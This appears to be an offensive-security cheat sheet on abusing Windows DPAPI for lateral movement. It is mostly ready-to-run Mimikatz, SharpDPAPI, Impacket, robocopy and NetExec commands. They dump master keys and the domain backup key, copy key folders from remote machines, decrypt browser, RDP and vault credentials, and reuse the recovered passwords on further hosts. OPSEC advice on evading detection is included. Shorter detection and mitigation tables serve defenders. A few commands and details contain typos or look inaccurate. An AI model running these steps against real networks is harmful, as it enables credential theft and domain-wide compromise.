# DPAPI for Lateral Movement

Windows Data Protection API (DPAPI) is used by Windows to protect secrets like saved credentials, browser passwords, certificates, and application data. DPAPI master keys can be extracted and used to decrypt secrets on other machines — enabling lateral movement via credential theft.

## How It Works

1. DPAPI uses **master keys** (stored in `%APPDATA%\Microsoft\Protect\{SID}`) protected by the user's password hash
2. **Domain backup keys** (DPAPI_SYSTEM LSA secret) can decrypt any user's master keys in the domain
3. Extracting master keys from one machine allows decryption of DPAPI-protected secrets on that machine
4. Master keys can be **roamed** — transferred between machines for the same user
5. Domain DPAPI backup keys (stored on DC at `C:\Windows\NTDS\` or in Active Directory) enable universal DPAPI decryption

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges (master key extraction) | Local admin or SYSTEM on the source machine |
| Privileges (domain backup key) | Domain admin (DA) or access to NTDS.dit |
| File access | SMB or other file transfer to move master key blobs |
| Target user profile | Must exist on target or use domain backup keys |
| Password | User password or hash needed to decrypt master key |

---

## Master Key Locations

### User Master Keys

```
%USERPROFILE%\AppData\Roaming\Microsoft\Protect\{SID}\
  - {GUID}          # Master key file (encrypted)
  - Preferred        # Preferred master key GUID (no extension)

# Example
C:\Users\jdoe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234-500\
  - 3e7d3e12-...     # Master key
  - Preferred
```

### System Master Keys

```
%SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-18\  # SYSTEM context
%SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-19\  # Local Service
%SYSTEMROOT%\System32\Microsoft\Protect\S-1-5-20\  # Network Service
```

### Domain DPAPI Backup Key

```
# On Domain Controller
C:\Windows\NTDS\ntds.dit

# LSA secret location in registry
HKLM\SECURITY\Policy\Secrets\DPAPI_SYSTEM
```

---

## Extracting DPAPI Master Keys

### SharpDPAPI — Dump Master Keys (Local)

```
# Dump all master keys from current user
SharpDPAPIl.exe masterkeys

# Dump master keys for a specific user profile
SharpDPAPI.exe masterkeys /target:C:\Users\jdoe\AppData\Roaming\Microsoft\Protect

# Dump master keys and attempt decryption with password
SharpDPAPI.exe masterkeys /password:Password123!

# Dump master keys with domain backup key
SharpDPAPI.exe masterkeys /backupkey:domain_backup_key_file

# Dump from all users on system
SharpDPAPI.exe masterkeys /all

# Output as readable format
SharpDPAPI.exe masterkeys /format:hashcat
```

### SharpDPAPI — Extract from LSASS

```
# Extract master keys from lsass (requires admin)
SharpDPAPI.exe machinemasterkeys

# Dump machine key
SharpDPAPI.exe machinemasterkeys /server:target
```

### Mimikatz — Extract DPAPI Keys

```
# Extract DPAPI_SYSTEM LSA secret (needs SYSTEM)
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets

# Extract domain DPAPI backup key
mimikatz # lsadump::backupkeys /system:dc01.domain.local

# Extract master key for current user
mimikatz # dpapi::masterkey /in:"C:\Users\jdoe\AppData\Roaming\Microsoft\Protect\SID\KEY_GUID"

# Decrypt master key with password
mimikatz # dpapi::masterkey /in:"KEY_FILE" /sid:S-1-5-21-... /password:Password123!

# Decrypt master key with domain backup key
mimikatz # dpapi::masterkey /in:"KEY_FILE" /sid:S-1-5-21-... /backupkey:backupkey.der

# List all master keys on system
mimikatz # dpapi::cache
```

### Domain Backup Key Extraction

```
# On Domain Controller — as DA
mimikatz # lsadump::backupkeys /export

# Output: backupkey.pfx and backupkey.der files

# Via DPAPI_SYSTEM from NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM -dc-ip DC target

# Also via Impacket
secretsdump.py DOMAIN/DA:'pass'@dc -just-dc-user 'DOMAIN\$'
```

---

## Transferring Master Keys Between Machines

### Robocopy — Copy Master Key Directory

```
# Copy user's master keys from source to local machine
robocopy \\source\C$\Users\admin\AppData\Roaming\Microsoft\Protect C:\temp\Protect /E

# Copy system master keys
robocopy \\source\C$\Windows\System32\Microsoft\Protect C:\temp\SysProtect /E

# With credentials
net use \\source\C$ /user:DOMAIN\admin
robocopy \\source\C$\Users\admin\AppData\Roaming\Microsoft\Protect C:\temp\Protect /E /COPY:DAT
net use \\source\C$ /delete
```

### Copy via SMB

```
# Using NetExec to download
nxc smb target -u admin -H NTLM --get-file "C:\Users\admin\AppData\Roaming\Microsoft\Protect\SID\KEY" masterkey.bin
```

### Copy via PowerShell

```powershell
# Copy master keys from remote machine
$s = New-PSSession -ComputerName target
Copy-Item -Path "C:\Users\admin\AppData\Roaming\Microsoft\Protect\*" -Destination "C:\temp\Protect\" -Recurse -FromSession $s
Remove-PSSession $s
```

---

## Decrypting Secrets with Master Keys

### SharpDPAPI — Decrypt Chrome Credentials

```
# Decrypt Chrome saved passwords using master keys
SharpDPAPI.exe chrome /masterkey:decrypted_master_key /target:C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data

# Decrypt Chrome with all master keys (auto-detect)
SharpDPAPI.exe chrome

# Decrypt Chrome cookies
SharpDPAPI.exe chrome /type:cookies
```

### SharpDPAPI — Decrypt Saved Credentials

```
# Decrypt Windows Credentials (Credential Manager)
SharpDPAPI.exe creds /masterkey:decrypted_key

# Decrypt all credentials automatically
SharpDPAPI.exe creds

# Target specific credential file
SharpDPAPI.exe creds /target:C:\Users\jdoe\AppData\Roaming\Microsoft\Credentials\*
```

### SharpDPAPI — Decrypt RDP Saved Credentials

```
# RDP credentials are stored in Credential Manager
SharpDPAPI.exe creds /target:C:\Users\jdoe\AppData\Roaming\Microsoft\Credentials\* | grep -i rdp

# The decrypted RDP credentials contain password/domain for RDG or RDP connections
```

### SharpDPAPI — Decrypt Vault Credentials

```
# Windows Vault
SharpDPAPI.exe vaults

# Vault files location:
%LOCALAPPDATA%\Microsoft\Vault\
```

### Mimikatz — Decrypt DPAPI Blob

```
# Decrypt arbitrary DPAPI blob
mimikatz # dpapi::blob /in:"blob.bin" /masterkey:decrypted_master_key_in_hex

# Decrypt with password directly
mimikatz # dpapi::blob /in:"blob.bin" /sid:S-1-5-21-... /password:Password123!

# Decrypt with domain backup key
mimikatz # dpapi::blob /in:"blob.bin" /backupkey:backupkey.der
```

---

## Lateral Movement Flow

### Step-by-step using DPAPI for lateral movement

```
# Step 1: Dump domain DPAPI backup key (requires DA)
mimikatz on DC # lsadump::backupkeys /export

# Step 2: Dump master keys from target machine
SharpDPAPI.exe masterkeys /server:target

# Or copy master keys locally
robocopy \\target\C$\Users\admin\AppData\Roaming\Microsoft\Protect .\protect /E

# Step 3: Decrypt master keys with domain backup key
SharpDPAPI.exe masterkeys /target:.\protect /backupkey:backupkey.der

# Step 4: Decrypt secrets with decrypted master keys
SharpDPAPI.exe creds /target:.\protect
SharpDPAPI.exe chrome /target:C:\Users\admin\AppData\...

# Step 5: Use recovered credentials for lateral movement
evil-winrm -i next-target -u DOMAIN\admin -p 'recovered_password'
nxc smb next-target -u admin -p 'recovered_password' -x whoami
```

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| Domain backup key | Critical | Grants ability to decrypt ANY domain user's DPAPI data |
| Master key copy | High | Copying Protect folder = transferring encrypted creds |
| Robocopy SMB | Medium | File copy is logged but may blend with normal admin activity |
| SharpDPAPI on disk | High | Known malicious tool, AV/EDR signatures |
| Mimikatz dpapi::blob | High | Known malicious behavior |
| Master key decryption | Medium | Memory-only decryption leaves fewer traces |
| Remote key extraction | High | Requires admin, triggers LSASS access alerts |

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4663 | Security | An attempt was made to access an object (Protect folder access) |
| 4656 | Security | A handle to an object was requested |
| 4670 | Security | Permissions on an object were changed |
| 5145 | Security | SMB file share access — Protect folder files accessed |
| 4688 | Security | Process creation (SharpDPAPI.exe, mimikatz.exe) |
| 4104 | PowerShell | Script block logging (PowerShell-based DPAPI tools) |
| 4624 | Security | LogonType 3 (Network — SMB access to copy keys) |
| 11 | Sysmon | File create (protect folder artifacts) |
| 7 | Sysmon | DLL load (crypt32.dll, ncrypt.dll — DPAPI usage) |

**Detection logic**:
- Access to `Microsoft\Protect\{SID}` folder contents from non-interactive processes = credential theft
- Batch copy of Protect folders via robocopy from remote to DC/workstation = lateral movement prep
- Multiple Protect folders accessed across many machines = large-scale DPAPI theft
- Domain backup key dumped from DC (Event 4662 on domain backup key object)
- Process accessing DPAPI master keys without legitimate parent process (explorer.exe)
- Certificate Services backup key export (certutil -exportpfx with DPAPI)

## Mitigation

| Control | Detail |
|---------|--------|
| Credential Guard | Protects LSASS, prevents master key extraction from memory |
| DPAPI NG | Windows Hello for Business uses DPAPI Next Generation (container-based) |
| Protected Users group | Members have AES-only Kerberos, no NTLM, no DES |
| Domain backup key rotation | Rotate DPAPI backup keys regularly |
| Restricted admin RDP | Prevents RDP credential caching |
| Credential Manager audit | Monitor for unexpected saved credentials |
| SMB auditing | Monitor access to Protect folders over SMB |
| LAPS | Local admin password management reduces credential reuse |

## When to Use DPAPI for Lateral Movement

- **Credential harvesting** — extract saved RDP, VPN, web credentials from compromised machines
- **Domain backup key available** — as DA, the backup key decrypts all domain users' DPAPI data
- **Master keys extracted** — from lsass or Protect folders, can decrypt credentials without password
- **Chrome/Edge credential theft** — browser passwords are DPAPI-protected
- **RDP credential reuse** — saved RDP credentials provide direct lateral movement paths
- **Password-less access** — master keys can be used directly without the user's password
- **Post-exploitation** — extract everything from the compromised machine before pivoting

## When NOT to Use DPAPI

- **No admin access** — cannot extract master keys from LSASS
- **Credential Guard enabled** — LSASs is protected, master keys cannot be extracted
- **DPAPI NG in use** — newer systems with Windows Hello may use container-based keys
- **No access to SMB** — cannot copy Protect folders
- **Machine not domain-joined** — no domain backup key, only local decryption possible
- **Target is application-specific** — some apps implement custom DPAPI protection
